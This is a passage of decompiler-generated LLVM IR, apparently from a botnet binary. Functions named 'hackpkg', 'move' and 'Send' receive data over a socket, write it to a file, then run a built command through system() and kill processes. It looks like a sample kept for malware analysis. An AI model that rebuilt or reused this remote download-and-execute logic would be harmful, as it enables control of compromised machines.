  %v0_8052ab0 = load i32, i32* @esp, align 4
  %v2_8052ab0 = icmp ugt i32 %v0_8052ab0, -17
  store i1 %v2_8052ab0, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8052ab3

dec_label_pc_8052ab3:                             ; preds = %dec_label_pc_8052a79, %dec_label_pc_8052a5e, %dec_label_pc_8052a97
  %v4_8052ab3 = add nuw nsw i32 %storemerge178, 1
  %v10_8052ab9 = icmp ult i32 %v4_8052ab3, %v6_8052a0c
  store i1 %v10_8052ab9, i1* %cf.global-to-local, align 1
  %exitcond202 = icmp eq i32 %v4_8052ab3, %v6_8052a0c
  br i1 %exitcond202, label %dec_label_pc_80529fb, label %dec_label_pc_8052a3e

dec_label_pc_8052ac3:                             ; preds = %dec_label_pc_80529fb
  store i1 %v5_8052693, i1* %cf.global-to-local, align 1
  %tmp131 = inttoptr i32 %v4_80528bb to i16*
  %v3_8052ac9 = call i32 @__GI_fclose(i16* %tmp131)
  store i1 %v5_8052723, i1* %cf.global-to-local, align 1
  %v2_8052adb = ptrtoint i32* %stack_var_-1132 to i32
  %tmp132 = bitcast i32* %stack_var_-1132 to i8*
  %v6_8052ae2 = call i32 @__GI_memset(i8* %tmp132, i32 0, i32 4096)
  store i1 %v5_8052693, i1* %cf.global-to-local, align 1
  %v3_8052b06 = call i32 @sprintf(i32 %v2_8052adb, i32 ptrtoint ([71 x i8]* @global_var_806a7d4.526 to i32))
  br label %dec_label_pc_8052d7f

dec_label_pc_8052b13:                             ; preds = %dec_label_pc_8052862
  %v4_8052b20 = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_806a81b.527 to i32), i32 ptrtoint ([3 x i8]* @global_var_8068d40.45 to i32))
  %v0_8052b25 = load i32, i32* @esp, align 4
  %v2_8052b25 = icmp ugt i32 %v0_8052b25, -17
  store i1 %v2_8052b25, i1* %cf.global-to-local, align 1
  %v2_8052b32 = ptrtoint i32* %stack_var_-5228 to i32
  br label %dec_label_pc_8052b2b

dec_label_pc_8052b2b:                             ; preds = %dec_label_pc_8052c54, %dec_label_pc_8052b13
  %v6_8052b3c = call i32 @recv(i32 %v5_8052643, i32 %v2_8052b32, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp134 = icmp slt i32 %v6_8052b3c, 1
  br i1 %tmp134, label %dec_label_pc_8052c68.preheader.loopexit29, label %dec_label_pc_8052b51

dec_label_pc_8052b51:                             ; preds = %dec_label_pc_8052b2b
  %v4_8052b51 = add i32 %v6_8052b3c, -4095
  %v8_8052b51 = icmp ult i32 %v6_8052b3c, 4095
  %v9_8052b51 = sub i32 4094, %v6_8052b3c
  %v10_8052b51 = and i32 %v9_8052b51, %v6_8052b3c
  %v11_8052b51 = icmp slt i32 %v10_8052b51, 0
  store i1 %v8_8052b51, i1* %cf.global-to-local, align 1
  %v12_8052b51 = icmp eq i32 %v4_8052b51, 0
  %v13_8052b51 = icmp slt i32 %v4_8052b51, 0
  %v3_8052b58 = icmp eq i1 %v13_8052b51, %v11_8052b51
  %v4_8052b58 = icmp eq i1 %v12_8052b51, false
  %v5_8052b58 = and i1 %v4_8052b58, %v3_8052b58
  br i1 %v5_8052b58, label %dec_label_pc_8052b71.lr.ph, label %dec_label_pc_8052b5a

dec_label_pc_8052b5a:                             ; preds = %dec_label_pc_8052b51
  %v0_8052b5d = load i32, i32* @ebp, align 4
  %v2_8052b5d = add i32 %v6_8052b3c, -5224
  %v3_8052b5d = add i32 %v2_8052b5d, %v0_8052b5d
  %v4_8052b5d = inttoptr i32 %v3_8052b5d to i8*
  store i8 0, i8* %v4_8052b5d, align 1
  br label %dec_label_pc_8052b71.lr.ph

dec_label_pc_8052b71.lr.ph:                       ; preds = %dec_label_pc_8052b5a, %dec_label_pc_8052b51
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8052b71

dec_label_pc_8052b71:                             ; preds = %dec_label_pc_8052b71.lr.ph, %dec_label_pc_8052c54
  %storemerge11169 = phi i32 [ 0, %dec_label_pc_8052b71.lr.ph ], [ %v4_8052c54, %dec_label_pc_8052c54 ]
  store i32 %storemerge11169, i32* %edx.global-to-local, align 4
  %v2_8052b7c = add i32 %storemerge11169, %v2_8052b32
  %v7_8052b7c = icmp ult i32 %v2_8052b7c, %v2_8052b32
  store i1 %v7_8052b7c, i1* %cf.global-to-local, align 1
  store i1 false, i1* @df, align 1
  %v4_8052b99 = inttoptr i32 %v2_8052b7c to i8*
  store i32 %v2_8052b7c, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8068d43.46 to i32), i32* @edi, align 4
  %v7_8052bab = call i32 @_strncmp(i8* %v4_8052b99, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068d43.46, i32 0, i32 0), i32 4)
  %v8_8052bab = urem i32 %v7_8052bab, 2
  %v9_8052bab = icmp eq i32 %v8_8052bab, 0
  %v0_8052bad = load i1, i1* %cf.global-to-local, align 1
  %v2_8052bad = or i1 %v0_8052bad, %v9_8052bab
  %v3_8052bad = zext i1 %v2_8052bad to i32
  %v4_8052bad = load i32, i32* %edx.global-to-local, align 4
  %v5_8052bad = and i32 %v4_8052bad, -256
  %v6_8052bad = or i32 %v3_8052bad, %v5_8052bad
  %v7_8052bad = xor i32 %v6_8052bad, 1
  store i32 %v7_8052bad, i32* @edx, align 4
  %v3_8052bb3 = and i32 %v7_8052bab, -256
  %v1_8052bb5 = trunc i32 %v7_8052bad to i8
  %v3_8052bb5 = zext i1 %v0_8052bad to i8
  %v4_8052bb5 = sub nsw i8 %v1_8052bb5, %v3_8052bb5
  %v15_8052bb5 = icmp eq i8 %v4_8052bb5, 0
  %v20_8052bb5 = zext i8 %v4_8052bb5 to i32
  %v23_8052bb5 = or i32 %v20_8052bb5, %v3_8052bb3
  store i32 %v23_8052bb5, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8052bbe = icmp eq i1 %v15_8052bb5, false
  br i1 %v1_8052bbe, label %dec_label_pc_8052c54, label %dec_label_pc_8052bc4

dec_label_pc_8052bc4:                             ; preds = %dec_label_pc_8052b71
  %v4_8052bc4 = add i32 %storemerge11169, 4
  %v1_8052bd3 = add i32 %v4_8052b20, 52
  %v2_8052bd3 = inttoptr i32 %v1_8052bd3 to i32*
  %v1_8052bdd = add i32 %v4_8052b20, 16
  %v2_8052bdd = inttoptr i32 %v1_8052bdd to i32*
  %v1_8052be3 = add i32 %v4_8052b20, 28
  %v2_8052be3 = inttoptr i32 %v1_8052be3 to i32*
  %v10_8052c49153 = icmp ult i32 %v4_8052bc4, %v6_8052b3c
  store i1 %v10_8052c49153, i1* %cf.global-to-local, align 1
  %v5_8052c4c159 = icmp slt i32 %v4_8052bc4, %v6_8052b3c
  br i1 %v5_8052c4c159, label %dec_label_pc_8052bca, label %dec_label_pc_8052c68.preheader

dec_label_pc_8052bca:                             ; preds = %dec_label_pc_8052bc4, %dec_label_pc_8052c43
  %storemerge24.in160 = phi i32 [ %v4_8052c43, %dec_label_pc_8052c43 ], [ %v4_8052bc4, %dec_label_pc_8052bc4 ]
  %v3_8052bd3 = load i32, i32* %v2_8052bd3, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8052bd6 = icmp eq i32 %v3_8052bd3, 0
  br i1 %v1_8052bd6, label %dec_label_pc_8052c25, label %dec_label_pc_8052bda

dec_label_pc_8052bda:                             ; preds = %dec_label_pc_8052bca
  %v3_8052bdd = load i32, i32* %v2_8052bdd, align 4
  store i32 %v3_8052bdd, i32* @edx, align 4
  %v3_8052be3 = load i32, i32* %v2_8052be3, align 4
  %v7_8052be6 = icmp ult i32 %v3_8052bdd, %v3_8052be3
  store i1 %v7_8052be6, i1* %cf.global-to-local, align 1
  %v1_8052be8 = icmp eq i1 %v7_8052be6, false
  br i1 %v1_8052be8, label %dec_label_pc_8052c05, label %dec_label_pc_8052bea

dec_label_pc_8052bea:                             ; preds = %dec_label_pc_8052bda
  %v3_8052bed = load i32, i32* %v2_8052bdd, align 4
  store i32 %v3_8052bed, i32* %edx.global-to-local, align 4
  %v0_8052bf3 = load i32, i32* @ebp, align 4
  %v2_8052bf3 = add i32 %storemerge24.in160, -5224
  %v3_8052bf3 = add i32 %v2_8052bf3, %v0_8052bf3
  %v4_8052bf3 = inttoptr i32 %v3_8052bf3 to i8*
  %v5_8052bf3 = load i8, i8* %v4_8052bf3, align 1
  %v3_8052bfa = inttoptr i32 %v3_8052bed to i8*
  store i8 %v5_8052bf3, i8* %v3_8052bfa, align 1
  %v0_8052bfc = load i32, i32* %edx.global-to-local, align 4
  %v1_8052bfc = add i32 %v0_8052bfc, 1
  store i32 %v1_8052bfc, i32* @edx, align 4
  store i32 %v1_8052bfc, i32* %v2_8052bdd, align 4
  br label %dec_label_pc_8052c43

dec_label_pc_8052c05:                             ; preds = %dec_label_pc_8052bda
  %v0_8052c08 = load i32, i32* @ebp, align 4
  %v2_8052c08 = add i32 %storemerge24.in160, -5224
  %v3_8052c08 = add i32 %v2_8052c08, %v0_8052c08
  %v4_8052c08 = inttoptr i32 %v3_8052c08 to i8*
  %v5_8052c08 = load i8, i8* %v4_8052c08, align 1
  %v0_8052c14 = load i32, i32* @esp, align 4
  %v5_8052c14 = icmp ult i32 %v0_8052c14, 8
  store i1 %v5_8052c14, i1* %cf.global-to-local, align 1
  %v5_8052c1b = call i32 @putc_unlocked(i8 %v5_8052c08, i32 %v4_8052b20)
  %v0_8052c20 = load i32, i32* @esp, align 4
  %v2_8052c20 = icmp ugt i32 %v0_8052c20, -17
  store i1 %v2_8052c20, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8052c43

dec_label_pc_8052c25:                             ; preds = %dec_label_pc_8052bca
  %v0_8052c28 = load i32, i32* @ebp, align 4
  %v2_8052c28 = add i32 %storemerge24.in160, -5224
  %v3_8052c28 = add i32 %v2_8052c28, %v0_8052c28
  %v4_8052c28 = inttoptr i32 %v3_8052c28 to i8*
  %v5_8052c28 = load i8, i8* %v4_8052c28, align 1
  %v0_8052c34 = load i32, i32* @esp, align 4
  %v5_8052c34 = icmp ult i32 %v0_8052c34, 8
  store i1 %v5_8052c34, i1* %cf.global-to-local, align 1
  %v5_8052c3b = call i32 @__GI_fputc(i8 %v5_8052c28, i32 %v4_8052b20)
  %v0_8052c40 = load i32, i32* @esp, align 4
  %v2_8052c40 = icmp ugt i32 %v0_8052c40, -17
  store i1 %v2_8052c40, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8052c43

dec_label_pc_8052c43:                             ; preds = %dec_label_pc_8052c05, %dec_label_pc_8052bea, %dec_label_pc_8052c25
  %v4_8052c43 = add i32 %storemerge24.in160, 1
  %v10_8052c49 = icmp ult i32 %v4_8052c43, %v6_8052b3c
  store i1 %v10_8052c49, i1* %cf.global-to-local, align 1
  %exitcond201 = icmp eq i32 %v4_8052c43, %v6_8052b3c
  br i1 %exitcond201, label %dec_label_pc_8052c68.preheader, label %dec_label_pc_8052bca

dec_label_pc_8052c68.preheader.loopexit29:        ; preds = %dec_label_pc_8052b2b
  %.pre52 = add i32 %v4_8052b20, 52
  %.pre53 = inttoptr i32 %.pre52 to i32*
  %.pre55 = add i32 %v4_8052b20, 16
  %.pre56 = inttoptr i32 %.pre55 to i32*
  %.pre57 = add i32 %v4_8052b20, 28
  %.pre58 = inttoptr i32 %.pre57 to i32*
  br label %dec_label_pc_8052c68.preheader

dec_label_pc_8052c68.preheader:                   ; preds = %dec_label_pc_8052bc4, %dec_label_pc_8052c43, %dec_label_pc_8052c68.preheader.loopexit29
  %v2_8052cc4.pre-phi = phi i32* [ %.pre58, %dec_label_pc_8052c68.preheader.loopexit29 ], [ %v2_8052be3, %dec_label_pc_8052c43 ], [ %v2_8052be3, %dec_label_pc_8052bc4 ]
  %v2_8052cbe.pre-phi = phi i32* [ %.pre56, %dec_label_pc_8052c68.preheader.loopexit29 ], [ %v2_8052bdd, %dec_label_pc_8052c43 ], [ %v2_8052bdd, %dec_label_pc_8052bc4 ]
  %v2_8052cb4.pre-phi = phi i32* [ %.pre53, %dec_label_pc_8052c68.preheader.loopexit29 ], [ %v2_8052bd3, %dec_label_pc_8052c43 ], [ %v2_8052bd3, %dec_label_pc_8052bc4 ]
  br label %dec_label_pc_8052c68

dec_label_pc_8052c54:                             ; preds = %dec_label_pc_8052b71
  %v4_8052c54 = add nuw nsw i32 %storemerge11169, 1
  %v10_8052c5a = icmp ult i32 %v4_8052c54, %v6_8052b3c
  store i1 %v10_8052c5a, i1* %cf.global-to-local, align 1
  %v5_8052c5d = icmp slt i32 %v4_8052c54, %v6_8052b3c
  br i1 %v5_8052c5d, label %dec_label_pc_8052b71, label %dec_label_pc_8052b2b

dec_label_pc_8052c68:                             ; preds = %dec_label_pc_8052d24, %dec_label_pc_8052c68.preheader
  %v6_8052c79 = call i32 @recv(i32 %v5_8052643, i32 %v2_8052b32, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp135 = icmp slt i32 %v6_8052c79, 1
  br i1 %tmp135, label %dec_label_pc_8052d38, label %dec_label_pc_8052c8e

dec_label_pc_8052c8e:                             ; preds = %dec_label_pc_8052c68
  %v4_8052c8e = add i32 %v6_8052c79, -4095
  %v8_8052c8e = icmp ult i32 %v6_8052c79, 4095
  %v9_8052c8e = sub i32 4094, %v6_8052c79
  %v10_8052c8e = and i32 %v9_8052c8e, %v6_8052c79
  %v11_8052c8e = icmp slt i32 %v10_8052c8e, 0
  store i1 %v8_8052c8e, i1* %cf.global-to-local, align 1
  %v12_8052c8e = icmp eq i32 %v4_8052c8e, 0
  %v13_8052c8e = icmp slt i32 %v4_8052c8e, 0
  %v3_8052c95 = icmp eq i1 %v13_8052c8e, %v11_8052c8e
  %v4_8052c95 = icmp eq i1 %v12_8052c8e, false
  %v5_8052c95 = and i1 %v4_8052c95, %v3_8052c95
  br i1 %v5_8052c95, label %dec_label_pc_8052cab.lr.ph, label %dec_label_pc_8052c97

dec_label_pc_8052c97:                             ; preds = %dec_label_pc_8052c8e
  %v0_8052c9a = load i32, i32* @ebp, align 4
  %v2_8052c9a = add i32 %v6_8052c79, -5224
  %v3_8052c9a = add i32 %v2_8052c9a, %v0_8052c9a
  %v4_8052c9a = inttoptr i32 %v3_8052c9a to i8*
  store i8 0, i8* %v4_8052c9a, align 1
  br label %dec_label_pc_8052cab.lr.ph

dec_label_pc_8052cab.lr.ph:                       ; preds = %dec_label_pc_8052c97, %dec_label_pc_8052c8e
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8052cab

dec_label_pc_8052cab:                             ; preds = %dec_label_pc_8052d24, %dec_label_pc_8052cab.lr.ph
  %storemerge9151 = phi i32 [ 0, %dec_label_pc_8052cab.lr.ph ], [ %v4_8052d24, %dec_label_pc_8052d24 ]
  %v3_8052cb4 = load i32, i32* %v2_8052cb4.pre-phi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8052cb7 = icmp eq i32 %v3_8052cb4, 0
  br i1 %v1_8052cb7, label %dec_label_pc_8052d06, label %dec_label_pc_8052cbb

dec_label_pc_8052cbb:                             ; preds = %dec_label_pc_8052cab
  %v3_8052cbe = load i32, i32* %v2_8052cbe.pre-phi, align 4
  store i32 %v3_8052cbe, i32* @edx, align 4
  %v3_8052cc4 = load i32, i32* %v2_8052cc4.pre-phi, align 4
  %v7_8052cc7 = icmp ult i32 %v3_8052cbe, %v3_8052cc4
  store i1 %v7_8052cc7, i1* %cf.global-to-local, align 1
  %v1_8052cc9 = icmp eq i1 %v7_8052cc7, false
  br i1 %v1_8052cc9, label %dec_label_pc_8052ce6, label %dec_label_pc_8052ccb

dec_label_pc_8052ccb:                             ; preds = %dec_label_pc_8052cbb
  %v3_8052cce = load i32, i32* %v2_8052cbe.pre-phi, align 4
  store i32 %v3_8052cce, i32* %edx.global-to-local, align 4
  %v0_8052cd4 = load i32, i32* @ebp, align 4
  %v2_8052cd4 = add nsw i32 %storemerge9151, -5224
  %v3_8052cd4 = add i32 %v2_8052cd4, %v0_8052cd4
  %v4_8052cd4 = inttoptr i32 %v3_8052cd4 to i8*
  %v5_8052cd4 = load i8, i8* %v4_8052cd4, align 1
  %v3_8052cdb = inttoptr i32 %v3_8052cce to i8*
  store i8 %v5_8052cd4, i8* %v3_8052cdb, align 1
  %v0_8052cdd = load i32, i32* %edx.global-to-local, align 4
  %v1_8052cdd = add i32 %v0_8052cdd, 1
  store i32 %v1_8052cdd, i32* @edx, align 4
  store i32 %v1_8052cdd, i32* %v2_8052cbe.pre-phi, align 4
  br label %dec_label_pc_8052d24

dec_label_pc_8052ce6:                             ; preds = %dec_label_pc_8052cbb
  %v0_8052ce9 = load i32, i32* @ebp, align 4
  %v2_8052ce9 = add nsw i32 %storemerge9151, -5224
  %v3_8052ce9 = add i32 %v2_8052ce9, %v0_8052ce9
  %v4_8052ce9 = inttoptr i32 %v3_8052ce9 to i8*
  %v5_8052ce9 = load i8, i8* %v4_8052ce9, align 1
  %v0_8052cf5 = load i32, i32* @esp, align 4
  %v5_8052cf5 = icmp ult i32 %v0_8052cf5, 8
  store i1 %v5_8052cf5, i1* %cf.global-to-local, align 1
  %v5_8052cfc = call i32 @putc_unlocked(i8 %v5_8052ce9, i32 %v4_8052b20)
  %v0_8052d01 = load i32, i32* @esp, align 4
  %v2_8052d01 = icmp ugt i32 %v0_8052d01, -17
  store i1 %v2_8052d01, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8052d24

dec_label_pc_8052d06:                             ; preds = %dec_label_pc_8052cab
  %v0_8052d09 = load i32, i32* @ebp, align 4
  %v2_8052d09 = add nsw i32 %storemerge9151, -5224
  %v3_8052d09 = add i32 %v2_8052d09, %v0_8052d09
  %v4_8052d09 = inttoptr i32 %v3_8052d09 to i8*
  %v5_8052d09 = load i8, i8* %v4_8052d09, align 1
  %v0_8052d15 = load i32, i32* @esp, align 4
  %v5_8052d15 = icmp ult i32 %v0_8052d15, 8
  store i1 %v5_8052d15, i1* %cf.global-to-local, align 1
  %v5_8052d1c = call i32 @__GI_fputc(i8 %v5_8052d09, i32 %v4_8052b20)
  %v0_8052d21 = load i32, i32* @esp, align 4
  %v2_8052d21 = icmp ugt i32 %v0_8052d21, -17
  store i1 %v2_8052d21, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8052d24

dec_label_pc_8052d24:                             ; preds = %dec_label_pc_8052ce6, %dec_label_pc_8052ccb, %dec_label_pc_8052d06
  %v4_8052d24 = add nuw nsw i32 %storemerge9151, 1
  %v10_8052d2a = icmp ult i32 %v4_8052d24, %v6_8052c79
  store i1 %v10_8052d2a, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_8052d24, %v6_8052c79
  br i1 %exitcond, label %dec_label_pc_8052c68, label %dec_label_pc_8052cab

dec_label_pc_8052d38:                             ; preds = %dec_label_pc_8052c68
  store i1 %v5_8052693, i1* %cf.global-to-local, align 1
  %tmp136 = inttoptr i32 %v4_8052b20 to i16*
  %v3_8052d3e = call i32 @__GI_fclose(i16* %tmp136)
  store i1 %v5_8052723, i1* %cf.global-to-local, align 1
  %v2_8052d50 = ptrtoint i32* %stack_var_-1132 to i32
  %tmp137 = bitcast i32* %stack_var_-1132 to i8*
  %v6_8052d57 = call i32 @__GI_memset(i8* %tmp137, i32 0, i32 4096)
  store i32 ptrtoint ([188 x i8]* @global_var_806a824.528 to i32), i32* %edx.global-to-local, align 4
  store i1 %v5_8052723, i1* %cf.global-to-local, align 1
  %tmp138 = bitcast i32* %stack_var_-1132 to i16*
  %v6_8052d77 = call i32 @memcpy(i16* %tmp138, i32 ptrtoint ([188 x i8]* @global_var_806a824.528 to i32), i32 188)
  br label %dec_label_pc_8052d7f

dec_label_pc_8052d7f:                             ; preds = %dec_label_pc_8052ac3, %dec_label_pc_8052d38
  %v2_8052d9e.pre-phi = phi i32 [ %v2_8052adb, %dec_label_pc_8052ac3 ], [ %v2_8052d50, %dec_label_pc_8052d38 ]
  store i1 %v5_8052693, i1* %cf.global-to-local, align 1
  %v2_8052d85 = call i32 @close(i32 %arg1)
  store i1 %v5_8052693, i1* %cf.global-to-local, align 1
  %v2_8052d93 = call i32 @close(i32 %v5_8052643)
  store i1 %v5_8052693, i1* %cf.global-to-local, align 1
  %v2_8052da5 = call i32 @system(i32 %v2_8052d9e.pre-phi)
  store i1 %v5_8052b13, i1* %cf.global-to-local, align 1
  %v4_8052db4 = call i32 @kill(i32 9, i32 0)
  store i1 %v5_8052693, i1* %cf.global-to-local, align 1
  %v2_8052dc1 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8052dc6

dec_label_pc_8052dc6:                             ; preds = %entry, %dec_label_pc_8052d7f
  %v0_8052dcc = phi i32 [ %v2_8052604, %entry ], [ %v2_8052dc1, %dec_label_pc_8052d7f ]
  ret i32 %v0_8052dcc

; uselistorder directives
  uselistorder i32 %storemerge9151, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8052c8e, { 1, 0 }
  uselistorder i32 %v6_8052c79, { 0, 4, 3, 1, 5, 7, 6, 2 }
  uselistorder i32 %v4_8052c54, { 1, 0, 2 }
  uselistorder i32* %v2_8052cbe.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v4_8052c43, { 1, 2, 0 }
  uselistorder i32 %storemerge24.in160, { 0, 3, 2, 1 }
  uselistorder i1 %v0_8052bad, { 1, 0 }
  uselistorder i32 %v7_8052bab, { 1, 0 }
  uselistorder i32 %storemerge11169, { 2, 0, 3, 1 }
  uselistorder i32 %v4_8052b51, { 1, 0 }
  uselistorder i32 %v6_8052b3c, { 8, 7, 3, 0, 2, 1, 6, 4, 9, 11, 10, 5 }
  uselistorder i32 %v2_8052b32, { 1, 3, 0, 2 }
  uselistorder i32 %v4_8052b20, { 10, 5, 6, 0, 1, 2, 3, 4, 8, 7, 9 }
  uselistorder i32 %storemerge178, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8052a21, { 1, 0 }
  uselistorder i32 %v6_8052a0c, { 0, 4, 3, 1, 5, 7, 6, 2 }
  uselistorder i32 %v4_80529e7, { 1, 0, 2 }
  uselistorder i32* %v2_8052a51.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v4_80529da, { 1, 2, 0 }
  uselistorder i32 %storemerge22.in187, { 0, 3, 2, 1 }
  uselistorder i1 %v0_8052948, { 1, 0 }
  uselistorder i32 %v7_8052946, { 1, 0 }
  uselistorder i32 %storemerge8196, { 2, 0, 3, 1 }
  uselistorder i32 %v4_80528ec, { 1, 0 }
  uselistorder i32 %v6_80528d7, { 8, 7, 3, 0, 2, 1, 6, 4, 9, 11, 10, 5 }
  uselistorder i32 %v2_80528cd, { 1, 3, 0, 2 }
  uselistorder i32 %v4_80528bb, { 10, 5, 6, 0, 1, 2, 3, 4, 8, 7, 9 }
  uselistorder i32 %storemerge13, { 0, 1, 3, 2 }
  uselistorder i32 %v5_8052765, { 1, 0, 2 }
  uselistorder i1 %v5_8052723, { 2, 5, 4, 6, 3, 1, 0, 7 }
  uselistorder i32 %v2_8052697, { 1, 0, 2 }
  uselistorder i1 %v5_8052693, { 6, 5, 4, 3, 12, 7, 11, 2, 10, 1, 0, 9, 8 }
  uselistorder i32 %v5_8052643, { 3, 4, 5, 1, 2, 6, 7, 0, 8 }
  uselistorder i32 %v4_8052614, { 1, 0 }
  uselistorder i32 %v12_80525f0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-5260, { 4, 5, 6, 0, 1, 7, 2, 8, 3, 9 }
  uselistorder i32* %stack_var_-108, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-104, { 1, 0, 2 }
  uselistorder i32* %stack_var_-1132, { 0, 1, 4, 2, 5, 3, 6 }
  uselistorder i1* %cf.global-to-local, { 5, 6, 7, 8, 9, 10, 11, 12, 19, 13, 14, 15, 16, 17, 18, 3, 20, 21, 32, 28, 22, 23, 24, 25, 26, 27, 0, 29, 30, 31, 4, 33, 34, 35, 37, 38, 39, 46, 40, 41, 42, 43, 44, 45, 101, 47, 48, 59, 55, 49, 50, 51, 52, 53, 54, 2, 56, 57, 58, 1, 60, 61, 62, 36, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100 }
  uselistorder i32 %arg4, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8052dc6, { 1, 0 }
  uselistorder label %dec_label_pc_8052d7f, { 1, 0 }
  uselistorder label %dec_label_pc_8052d24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052c68.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052c43, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052bca, { 1, 0 }
  uselistorder label %dec_label_pc_8052b71, { 1, 0 }
  uselistorder label %dec_label_pc_8052ab3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80529fb.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80529da, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052965, { 1, 0 }
  uselistorder label %dec_label_pc_805290c, { 1, 0 }
  uselistorder label %dec_label_pc_8052862, { 1, 0 }
  uselistorder label %dec_label_pc_80527ee, { 1, 0 }
  uselistorder label %dec_label_pc_8052758, { 1, 0 }
  uselistorder label %dec_label_pc_805270a, { 1, 0 }
  uselistorder label %dec_label_pc_80526e5, { 1, 0 }
  uselistorder label %dec_label_pc_8052674, { 1, 0 }
  uselistorder label %dec_label_pc_805263a, { 1, 0 }
}

define i32 @move(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp20 = icmp slt i32 %arg3, 1
  %tmp21 = icmp eq i1 %tmp20, false
  br i1 %tmp21, label %entry.dec_label_pc_8052df9_crit_edge, label %dec_label_pc_8052dd9

entry.dec_label_pc_8052df9_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8052df9

dec_label_pc_8052dd9:                             ; preds = %entry
  %v3_8052de7 = call i32 @Send(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_806a8e0.529 to i32))
  %v1_8052df4 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_8052df9

dec_label_pc_8052df9:                             ; preds = %entry.dec_label_pc_8052df9_crit_edge, %dec_label_pc_8052dd9
  %v1_8052dfc = add i32 %arg4, 4
  %v1_8052dff = inttoptr i32 %v1_8052dfc to i32*
  %v2_8052dff = load i32, i32* %v1_8052dff, align 4
  %v1_8052e05 = inttoptr i32 %v2_8052dff to i8*
  %v2_8052e05 = call i32 @__GI_strdup(i8* %v1_8052e05)
  store i32 %v2_8052e05, i32* @global_var_807cc84.530, align 4
  store i32 1, i32* @global_var_807406c.531, align 4
  %v1_8052e22 = call i32 @close(i32 %arg1)
  ret i32 %v1_8052e22

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052df9, { 1, 0 }
}

define i32 @hackpkg(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-6212 = alloca i32, align 4
  %stack_var_-5957 = alloca i32, align 4
  %stack_var_-5702 = alloca i32, align 4
  %stack_var_-5447 = alloca i32, align 4
  %stack_var_-5192 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-1096 = alloca i32, align 4
  %stack_var_-6252 = alloca i32, align 4
  %v5_8052e37 = icmp ult i32* %stack_var_-6252, inttoptr (i32 8 to i32*)
  store i1 %v5_8052e37, i1* %cf.global-to-local, align 1
  %v5_8052e44 = call i32 @mkdir(i32 ptrtoint ([9 x i8]* @global_var_806a8fa.532 to i32), i16 509)
  store i32 %v5_8052e44, i32* @eax, align 4
  %v5_8052e4c = icmp ult i32* %stack_var_-6252, inttoptr (i32 12 to i32*)
  store i1 %v5_8052e4c, i1* %cf.global-to-local, align 1
  %v2_8052e52 = call i32 @mfork(i32 %arg2)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8052e5a = icmp eq i32 %v2_8052e52, 0
  %v1_8052e5c = icmp eq i1 %v1_8052e5a, false
  br i1 %v1_8052e5c, label %dec_label_pc_80533f1, label %dec_label_pc_8052e62

dec_label_pc_8052e62:                             ; preds = %entry
  %v12_8052e31 = ptrtoint i32* %stack_var_-6252 to i32
  %v4_8052e62 = add i32 %arg3, -1
  %v8_8052e62 = icmp eq i32 %arg3, 0
  %v9_8052e62 = sub i32 0, %arg3
  %v10_8052e62 = and i32 %arg3, %v9_8052e62
  %v11_8052e62 = icmp slt i32 %v10_8052e62, 0
  store i1 %v8_8052e62, i1* %cf.global-to-local, align 1
  %v12_8052e62 = icmp eq i32 %v4_8052e62, 0
  %v13_8052e62 = icmp slt i32 %v4_8052e62, 0
  %v3_8052e66 = icmp eq i1 %v13_8052e62, %v11_8052e62
  %v4_8052e66 = icmp eq i1 %v12_8052e62, false
  %v5_8052e66 = and i1 %v4_8052e66, %v3_8052e66
  br i1 %v5_8052e66, label %dec_label_pc_8052e88, label %dec_label_pc_8052e68

dec_label_pc_8052e68:                             ; preds = %dec_label_pc_8052e62
  %v5_8052e68 = icmp ult i32* %stack_var_-6252, inttoptr (i32 4 to i32*)
  store i1 %v5_8052e68, i1* %cf.global-to-local, align 1
